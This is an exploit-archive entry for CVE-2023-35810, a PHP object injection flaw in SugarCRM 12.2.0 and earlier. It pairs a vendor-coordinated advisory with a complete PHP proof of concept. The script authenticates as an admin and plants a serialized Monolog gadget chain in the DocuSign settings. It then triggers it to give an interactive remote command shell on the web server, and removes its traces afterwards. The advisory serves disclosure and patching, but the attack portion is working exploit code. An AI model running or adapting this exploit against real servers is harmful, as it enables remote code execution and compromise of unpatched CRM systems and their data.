@@ -1,0 +1,146 @@
+id: 39005
+date: 08/24/2023
+title: SugarCRM 12.2.0 PHP Object Injection Vulnerability
+author: EgiX
+cves: CVE-2023-35810
+
+-------------------------------------------------------------------------------
+SugarCRM <= 12.2.0 (Docusign_GlobalSettings) PHP Object Injection 
+Vulnerability
+-------------------------------------------------------------------------------
+
+
+[-] Software Link:
+
+https://www.sugarcrm.com
+
+
+[-] Affected Versions:
+
+Version 12.2.0 and prior versions.
+Version 12.0.2 and prior versions.
+Version 11.0.5 and prior versions.
+
+
+[-] Vulnerability Description:
+
+There is a Second-Order PHP Object Injection vulnerability which might 
+allow malicious
+admin users to execute arbitrary PHP code on the web server (RCE) by 
+storing malicious
+serialized objects into the database.
+
+The vulnerability can be triggered by invoking the 
+"/DocuSign/getGlobalConfig" REST API
+endpoint, which is using the unserialize() PHP function with the 
+"Docusign_GlobalSettings"
+parameter. This can be exploited to inject arbitrary PHP objects into 
+the application
+scope, allowing an attacker to perform a variety of attacks.
+
+
+[-] Proof of Concept:
+
+https://karmainsecurity.com/pocs/CVE-2023-35810.php
+
+[Packet Storm Note: see below]
+
+[-] Solution:
+
+Upgrade to version 12.3.0, 12.0.3, 11.0.6, or later.
+
+
+[-] Disclosure Timeline:
+
+[14/02/2023] - Vendor notified
+[12/04/2023] - Fixed versions released
+[17/06/2023] - CVE number assigned
+[23/08/2023] - Publication of this advisory
+
+
+[-] CVE Reference:
+
+The Common Vulnerabilities and Exposures project (cve.mitre.org)
+has assigned the name CVE-2023-35810 to this vulnerability.
+
+
+[-] Credits:
+
+Vulnerability discovered by Egidio Romano.
+
+
+[-] Original Advisory:
+
+https://karmainsecurity.com/KIS-2023-07
+
+
+[-] Other References:
+
+https://support.sugarcrm.com/Resources/Security/sugarcrm-sa-2023-009/
+
+
+
+---- poc ----
+
+<?php
+
+set_time_limit(0);
+error_reporting(E_ERROR);
+
+if (!extension_loaded("curl")) die("[-] cURL extension required!\n");
+
+if ($argc != 4) die("Usage: php $argv[0] <URL> <username> <password>\n");
+
+include("chain.php");
+
+function inject_pop_chain($cmd)
+{
+  global $ch, $url;
+
+  $pop = new \Monolog\Handler\BufferHandler(["current", "system"], [$cmd, "level" => null]);
+  $pop = new \Monolog\Handler\SyslogUdpHandler($pop);
+  $pop = base64_encode(serialize($pop));
+
+  curl_setopt($ch, CURLOPT_URL, "{$url}rest/v11_18/Administration/config/Docusign");
+  curl_setopt($ch, CURLOPT_POSTFIELDS, '{"Docusign_GlobalSettings":"'.$pop.'"}');
+
+  curl_exec($ch);
+}
+
+list($url, $user, $pass) = [$argv[1], $argv[2], $argv[3]];
+
+print "[+] Logging in with username '{$user}' and password '{$pass}'\n";
+
+$ch = curl_init();
+
+$params = ["username" => $user, "password" => $pass, "grant_type" => "password", "client_id" => "sugar"];
+
+curl_setopt($ch, CURLOPT_URL, "{$url}rest/v11_18/oauth2/token");
+curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($params));
+curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+
+if (($token = (json_decode(curl_exec($ch)))->access_token) == null) die("[+] Login failed!\n");
+
+curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json", "OAuth-Token: {$token}"]);
+
+print "[+] Launching shell\n";
+
+while(1)
+{
+  print "\nsugar-shell# ";
+  if (($cmd = trim(fgets(STDIN))) == "exit") break;
+  inject_pop_chain($cmd);
+  curl_setopt($ch, CURLOPT_URL, "{$url}rest/v11_18/DocuSign/getGlobalConfig");
+   curl_setopt($ch, CURLOPT_POST, false);
+  preg_match("/(.+)/s", curl_exec($ch), $m) ? print $m[1] : die("\n[+] Exploit failed!\n");
+}
+
+// cleaning
+curl_setopt($ch, CURLOPT_URL, "{$url}rest/v11_18/Administration/config/Docusign");
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"Docusign_GlobalSettings":""}');
+
+curl_exec($ch);
+
+#  0day.today [2023-08-28]  #
